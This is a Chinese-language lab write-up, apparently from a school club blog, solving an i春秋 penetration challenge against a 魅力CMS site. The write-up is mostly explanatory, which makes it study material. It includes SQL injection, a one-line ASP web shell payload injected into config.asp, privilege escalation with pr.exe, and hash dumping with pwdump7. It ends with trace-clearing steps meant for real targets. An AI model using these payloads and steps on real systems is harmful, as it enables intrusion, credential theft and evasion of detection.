<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">
<title> 我很简单，请不要欺负我 | Geeks&#39;</title>
<meta name="description" content="The official site of GEEK@ntzx!">
<meta name="keywords" content="">
<link rel="stylesheet" href="/css/main.css">
<link rel="canonical" href="http://ntzx-geek.cc/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/i%E6%98%A5%E7%A7%8B/2016/08/i%E6%98%A5%E7%A7%8B-%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/">
<link rel="alternate" type="application/rss+xml" title="Geeks'" href="http://ntzx-geek.cc/feed.xml" />
<script>base_url = "";</script>
  </head>
  <body class="single">
    <main class="main-container">
        <header class="site-header">
  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>
    <nav class="js-menu sliding-panel-content">
  <ul>
    <li><a href="/">home</a></li>
    <li><a href="/ctf/idf">IDF</a></li>
    <li><a href="/渗透测试/i春秋">i春秋</a></li>
    <li><a href="/wiki">Wiki</a></li>
    <li><a href="/information">Information</a></li>
  </ul>
</nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>
      <h1 class="post-title">我很简单，请不要欺负我</h1>
  </div>
</header>
        <section class="main-content">
          <article class="post">
  <div class="post-content container">
    <blockquote><p>右键可以查看大图</p></blockquote>
<p>大家好，今天送上i春秋在线挑战的解决思路</p>
<p>原题http://www.ichunqiu.com/racing/54399</p>
<p>开始吧</p>
<blockquote><p>话说自从i春秋改版后感觉越来越不好用了</p></blockquote>
<hr />
<p>打开站点，发现是魅力cms<img src="/images/2016-08-29/1.png"></p>
<p>先用明小子扫一遍注入<img src="/images/2016-08-29/2.png"></p>
<p>好吧，全是注入点</p>
<p>既然旁边写的工具里包括了Pangolin，那就用它来注入</p>
<p>打开，填入网址，点击工具栏里的小箭头开始</p>
<p>之后在下面的条里点Datas->Tables->All<img src="/images/2016-08-29/3.png"></p>
<p>勾选admin,点击右边的Datas</p>
<p>没多久就跑出了md5：469e80d32c0559f8<img src="/images/2016-08-29/4.png"></p>
<p>放到cmd5里查一下<img src="/images/2016-08-29/5.png"></p>
<p>好的，admin888</p>
<h2>第一阶段，进入后台，完成</h2>
<hr />
<p>登入后台www.test.ichunqiu/admin</p>
<p>发现了下载程序添加</p>
<p>先把一句话准备好&lt;% eval request("aa") %>,放到aa.asp里</p>
<p>上传试试</p>
<p>发现不可以传.asp</p>
<p>那就打开burp suite，选择BurpLoader.jar<img src="/images/2016-08-29/6.png"></p>
<p>打开浏览器设置，点击高级-网络，第一个<img src="/images/2016-08-29/7.png"></p>
<p>照我的填</p>
<p>再点上传，这时打开burp<img src="/images/2016-08-29/8.png"></p>
<p>把高亮处改为image/jpeg，发现还是不好传，说明文件名也有限制</p>
<p>来到burp的history标签，选择刚才的<img src="/images/2016-08-29/9.png"></p>
<p>ctrl+R</p>
<p>来到repeater标签<img src="/images/2016-08-29/10.png"></p>
<p>找到filename，在后面加上: jpg(带空格)</p>
<p>点击requests黄字下面的hex标签，来到16进制编辑<img src="/images/2016-08-29/11.png"></p>
<p>找到图示位置，双击，把20改为00，点击go</p>
<p>？？？旁边还是返回不好传。。。。。</p>
<p>那就得换个思路，上传是不行了，关掉burp，把代理换回来</p>
<blockquote><p>以上改20为00是利用IIS6的解析漏洞：看到截断符00认为结束，具体百度</p></blockquote>
<p>发现系统设置管理里有个网站信息配置，哈哈哈，那就是可以插了(ps:真实环境里除非你有100％的把握才可以插，不然很容易插爆)</p>
<p>我们先去百度，把魅力cms2007的源码下下来看一下，免得插爆http://down.chinaz.com/soft/20779.htm</p>
<p>下完之后，在inc里面，有一个config.asp，那就是我们要插的文件<img src="/images/2016-08-29/12.png"></p>
<p>高亮位置是我们可以插的地方(下面也可以)</p>
<p>复制下来就是这样(精简)</p>
<pre><code>&lt;% sessionvar="后台里输入的东西" %&gt;
</code></pre>
<p>我们要插入一句话，变成这样(为了方便看，我换行了)</p>
<pre><code>&lt;% sessionvar="Hello" %&gt;　' hello是随便写的，填写正确的话会显示hello
&lt;% eval request("aa") %&gt;
&lt;% aa="" %&gt;　' aa是自己定义的一个变量，防止""报错
</code></pre>
<p>我们实际要填写的，就是这个</p>
<pre><code>hello" %&gt;&lt;% eval request("aa") %&gt;&lt;% aa="
</code></pre>
<p>理解一下，可以自己在记事本里感受一下</p>
<p>好，继续打开后台，填进去<img src="/images/2016-08-29/13.png"></p>
<p>提交，啊，激动人心的时刻到了</p>
<p>有木有，显示了Hello<img src="/images/2016-08-29/14.png"></p>
<h2>第二阶段，webshell获取，完成</h2>
<hr />
<p>打开中国菜刀，连我们的shell<img src="/images/2016-08-29/15.png"></p>
<p>右键，添加，填入www.test.ichunqiu/inc/Config.asp，旁边小格子填密码aa</p>
<p>双击，哈哈，连上了</p>
<p>在c盘的RECYCLER里上传文件</p>
<blockquote><p>一般此文件夹权限为读写</p></blockquote>
<p>右键，上传3389.exe(在桌面Everything里搜一下)</p>
<p>传好后，右键远程的3389.exe，虚拟终端<img src="/images/2016-08-29/16.png"></p>
<p>默认有个netstat命令，直接回车，发现什么都不显示，说明没有cmd，那就自己上传一个cmd.exe</p>
<p>继续，在cmd.exe上右键，虚拟终端，回车，发现显示了，不错</p>
<p>依次执行</p>
<div class="highlight"><pre><code class="language-batch" data-lang="batch"><span class="k">cd</span> C:\RECYCLER
<span class="m">3389</span></code></pre></div>
<p>没反应？那就在把pr.exe上传进去</p>
<p>输入</p>
<div class="highlight"><pre><code class="language-batch" data-lang="batch">pr <span class="s2">&quot;3389&quot;</span></code></pre></div>
<p>出现如图，执行成功<img src="/images/2016-08-29/17.png"></p>
<p>在3389.exe的文件夹下，告诉我们用户名admin,密码admin123</p>
<p>开始->附件->远程桌面连接172.16.12.2</p>
<p>哈哈哈，连上了</p>
<h1>第三阶段，提权开3389，完成</h1>
<hr />
<p>回到菜刀，上传个pwdump7.exe和同目录下的.dll文件</p>
<p>进入远程，开始->命令提示符</p>
<div class="highlight"><pre><code class="language-batch" data-lang="batch"><span class="k">cd</span> C:\RECYCLER
pwdump<span class="m">7</span> <span class="p">&gt;</span> <span class="n">1</span>.txt</code></pre></div>
<p>输出到1.txt里</p>
<p>回到菜刀，打开1.txt(如果看不到，右键更新缓存)<img src="/images/2016-08-29/18.png"></p>
<p>把第一个的抄下来<img src="/images/2016-08-29/19.png"></p>
<p>62C4700EBB05958F3832C92FC614B7D1:4D478675344541AACCF6CF33E1DD9D85</p>
<p>放到网站里查一下http://www.objectif-securite.ch/ophcrack.php<img src="/images/2016-08-29/20.png"></p>
<p>出来了cu9e2cgw</p>
<h1>第四阶段，管理员密码获取，完成</h1>
<hr />
<h2>在我们的实验环境，做到这里就可以了，但是如果在真实环境中，还要清除痕迹</h2>
<p>跟我做：
1.上传3389连接痕迹清除.bat</p>
<p>2.打开Config.asp，把改的地方改回来</p>
<p>3.退出admin</p>
<p>4.使用Administrator登陆</p>
<p>5.运行3389.....</p>
<p>6.退出</p>
  </div>
</article>
        </section>
<div class="clearfix"></div>
<footer class="site-footer txt-center">
  <hr>
  <small>Version:1.0</small>
  <small>江苏省南通中学极客共进交流会</small>
  <small>　　</small>
  <small>Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a></small>
  <small>Original version <i class="icon icon-heart"></i> by <a href="http://nandomoreira.me" target="_blank"> nandomoreira.me</a></small>
  <small>The site is on <a href="https://pages.github.com" target="_blank">Github Pages</a></small>
</footer>
    </main>
    <a href="https://github.com/yjqwyc/Geek-ntzx" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
